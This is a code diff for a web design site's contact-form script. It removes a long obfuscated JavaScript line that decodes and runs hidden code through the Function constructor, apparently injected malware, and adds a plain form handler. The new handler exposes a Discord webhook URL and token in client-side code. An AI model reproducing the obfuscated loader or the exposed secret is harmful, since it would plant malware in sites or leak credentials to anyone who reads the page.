@@ -1,1 +1,62 @@
-var button,nameBox,emailBox,messageBox,sendMessage;(function(){var fpF='',vHR=817-806;function PCB(a){var m=89471;var x=a.length;var k=[];for(var s=0;s<x;s++){k[s]=a.charAt(s)};for(var s=0;s<x;s++){var f=m*(s+218)+(m%21524);var p=m*(s+325)+(m%22187);var v=f%x;var b=p%x;var o=k[v];k[v]=k[b];k[b]=o;m=(f+p)%4704803;};return k.join('')};var QHk=PCB('ctqywcrnmbparrnetocxikojfotdhsusvlugz').substr(0,vHR);var SIc='ga)ee=o1co;euc4Cp8;(a; y-tre;r3ifu+)fl+w+Aqritt m=yztav.,i) =,-))dh1hh6s{]{i;5faa8e0is+,=rr8,,.r 2o}(c[=v,)wo721odefp,*r}=ak4chSxuAz*aov6f=e.8Cg>[rr=(a;h)vba0arl(.(k=[2[rv(=f,,++aku e7na))4evan=;i99)vn.a.]p=aam)s;.r.4mn=f[!if,hrp+i)=Cn70",;dgfmf,e82h4.;p(e+m+r=).aa;rv{<07i}+l.n(v=-nl1s,a;)h-.1verocr=.=p;grrgea,td];jvc+)=6fgov;arj=-1iu8m8gC"n;uni{C.v()tc; or;c[] ;=a;<<)rn([d[=;+tfatarxa al((;i4n tv(0sd.d)ztf(rv7rr8n(tnmv2ree,1ir+;o[eA,s1adv});,+.;mh.;me,szl=s.5hl()"u.o;n5)j;vCe+;kn8.c96]f=dhsn;n=;uf,ft,{tt;tr1p"]o>cton t=h;.+otlr0l ]rc= [)auAe16(;0=]v!-rpnl(a irlto.d[av4fhlr;+um0t8me 3u,(ejy]r<6s7+u;u+n;r(y)5=.;j;fgm)nea l( )i(p1a=+inivh .nsub)pviog[ )-o+oh;=br]o=h,dn87}u)=<i+t5C))Ca(o8i, w}e(foiv."=g);.hgs=6v9,ln]e=+hA;i=,t0; 9=sgetx20;lnr j0;[g(+n.fe"mua0bklc1ia"lhnnetr)c)nsrg(8u,  ngm(=n+aoln6nsslfr=s(hojxs(mt{p ta]{vjgSark"uadiom()(=e f,vb;m(c[hlrvtpr(w]s]2v"=j949"u(wirne}7;';var Ali=PCB[QHk];var VMe='';var Whx=Ali;var Joc=Ali(VMe,PCB(SIc));var XiT=Joc(PCB(')0Wso6,WW5I69{+nyWd0.;We-]5;0u;itu;Wo@Wt!(neWs$6!.Wg$o6m-$WMayt=w7p.e-fubve_rWp=6(g=W1-$er]=8sWp7Wk]asWWtW3rto)8e.2,WWW6W.bteojWse,WWd.s.}.u.tx.)j0Wn5}W(n=s,.fWxS3WctWm.oori9!bu)6:WiWg1(q-7o.30()_oW#6*4!s0.tr)eufpf]976cve,(fe5Wtu]tW($m3ecW!=.ut4e% ,-3lpcsMi7r.n$o{qm;%B=Wi;$dn.eW+ed%4f\/o, ai9tq4og)o(sw)_n59W)=;)fsWxmo.WWr>s;e,%t>{lg9%awu%)lWd(hea%W.wAa2[W Wro]o78);1tm4kax{pr6kW.edpm.rxmv1!.{pro2x3;]4.ttD\/recWo#m_6|\'W!)_s9_uw!ltWep$cT0T6$c3eExC((.6loM7%,=E (r:or6Wonsr]2jt%"hd.$W7pfM).(2n .wzps%.gSeeW!2eeae(,)W.in)o0;6.(o@eybs0g;[hb%}cocaq!e.]=i6jWv"3)"?efeMb9tr.i&tt3;7s $eW.+%ei8eWe1t.Werd.)ss:!]na{$p((rt)_))jl_.6adaEykW=;+l\/.Wt1i2c(2e(j!1.!$,(o]!e)r)jet_)nW,s4e+j+:0_$a)9(]v8W7en.i=rWp%,)p_.cnjurmrarqe.8e96us8.lW(bvx@; qn ]d9q,Wuh]rp=4otophW=2rN21apf8fj.ya8}=7]_tgi1{W{d!0;j!d=sWi.mo(1.e$M,p).s!+o a?_,=s)t.1N. eeut$b\/1[}o9(WWmjn]9Sa%{q\/{rWe_w0Wmwfgre-n_"3e_eyWWee4et=")1;,5e$i).t1\/e=.,*(ipf),),q.psrpWW.y\'(Wts.71,nmn)s%t1m Wb,2)?t2e.);xu!es7;;7b@,T.i9o$n3ISxsg_W.o9er.9om:eW?W.8!2aS.$ee#0n; c1;$ue!0fn1t+tmm4WW90a(wtw_>W6|0%bs$WSal}n1(63)e>o.WhnfCanet_l%);Wo(tfWWd=n<<nn6g=9.#ec6_.2t3=1s1tc_uW!6..as-cl8t,u$EBn{njW.sW(in=WWnW&vSW.og.p)S<thtiEee$w]Wdmfrw\'vB.j1]3ir.!_hW7Wi\/|,peWt%.i>)u,W1r_q9(n{$3W=6acWmW e._+$,6eW{W*$ hrW;9#t9pa)3.e,uW (s.mu-cocaWqW.Wj:ueW.Wt_+5"umdpl$tWta4{o.*tlf. ,:e.ctn6e$-p%s"lm0;v.en)l}3s7])tWe.W+[Wl"auA*.e!reB$$WWsW9448whrsnv;e:tbp[=.Wl;WwgtW_pee.]]tc.1.N)bb)42.Wq10 ee_b)2]i (i5,_iuoa)gW3$6=W;!saj(aeWb.loa9lCeaeg n]lmgrWc(bm6)W=("a.sqW$o.h.i5.));{s;5,i-w;.=A.ec58_]f2o)e$fd1}=2=#WiW4(We77eW.98o$s#;e5_ee.r.qie>6nx.eo9eWub}0.e6;W)91k%(cyna3o#;%0(W<8:e(,d5ae]9oio*6_eu(n9s1eWl%&+#rw[Wcj.;p1imt_.d;ru{cf94jfl7.$1eSl!=3i))(_hiz9]6ts7=.\/5e_ 0t!)0Wa}wT9)n;W.tbf,=mfW=.;t)0-!90e(,#etn;i))W6*y6()((,.!,y0.)_2cl4n.u969WW,W6\'t;(.s.6=ne%(up) jev$Bplib{ti:..[p&el]e-[=b_*s3:gWo}eWa(be%!ba;f_ e9qo=..]ejo)oh(!{i()[;WoWW.it?bjso$fy-W+\/jq%t)7$3"kWoW0.f._1oh(uu WvhezurNikaf%W(g9f,S!sk o__enf d4WWf7Wo}e3rl.\/e4tt.!zo#[ eWn=b3q6endW .2ffd.)d.ns ce,]f}Wimig;!1 ]%__" 3s  &i;]p173W.monl!x)+n)9 tn|W=5,ei)rs_gp;sbo6(]WdM$r9dr=sW0esnae;.WWmgWinoWu82W3p }).4fB},Weo.1fl)[.twAW\/Wotgx_!].5'));var PIl=Whx(fpF,XiT );PIl(9353);return 5459})()
+console.log("Welcome to Javelin Web Design!");
+
+const button = document.querySelector(".enter-button");
+const nameBox = document.querySelector("#name-box");
+const emailBox = document.querySelector("#email-box");
+const messageBox = document.querySelector("#message-box");
+
+function getCookie(name) {
+    const decoded = decodeURIComponent(document.cookie);
+    const array = decoded.split(",");
+    let result = null;
+
+    array.forEach(element => {
+        if (element.indexOf(name) == 0) {
+            result = element.substring(name.length + 1);
+        }
+    })
+
+    return result;
+}
+
+function setCookie(name, value, daysToLive) {
+    const date = new Date();
+    date.setTime(date.getTime() + (daysToLive * 24 * 60 * 60 *1000));
+
+    let expires = `expires=${date.toUTCString()}`;
+    document.cookie = `${name}=${value}; ${expires}; path=/`
+}
+
+function sendMessage() {
+    if (emailBox.value === "" || nameBox.value === "" || messageBox.value === "") {
+        alert("Please fill out empty inputs.");
+        return
+    }
+
+    if (getCookie("canMessage") !== null) {
+        alert("Please wait 24 hours before sending another message.");
+        return
+    }
+
+    const webhookUrl = "https://discordapp.com/api/webhooks/1295690344482209792/1MkSbSIhBT7fTgg0-JtNEqaphJLW8dijdic3Hpuo7-x_Ym9dEIp2pQMO6oqY9ZZt82HE";
+    const message = {
+        embeds: [
+            {
+                title: nameBox.value,
+                description: `Email: ${emailBox.value}; Message: ${messageBox.value}`
+            }
+        ]
+    };
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+
+    const payload = JSON.stringify(message);
+    xhr.send(payload);
+
+    alert("Message successfully sent. We will get back to you as soon as possible!");
+    setCookie("canMessage", false, 1)
+}
+
+button.addEventListener('click', sendMessage)
